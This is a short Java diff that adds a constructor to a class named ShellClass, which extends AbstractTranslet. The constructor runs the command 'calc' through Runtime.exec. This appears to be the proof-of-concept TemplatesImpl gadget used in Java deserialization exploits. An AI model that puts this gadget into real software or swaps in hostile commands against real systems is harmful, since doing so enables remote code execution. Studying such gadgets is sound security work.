@@ -38,4 +38,9 @@ public class ShellClass extends AbstractTranslet {
     public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
 
     }
+    public ShellClass() throws Exception {
+        super();
+        System.out.println("Hello TemplatesImpl");
+        Runtime.getRuntime().exec("calc");
+    }
 }
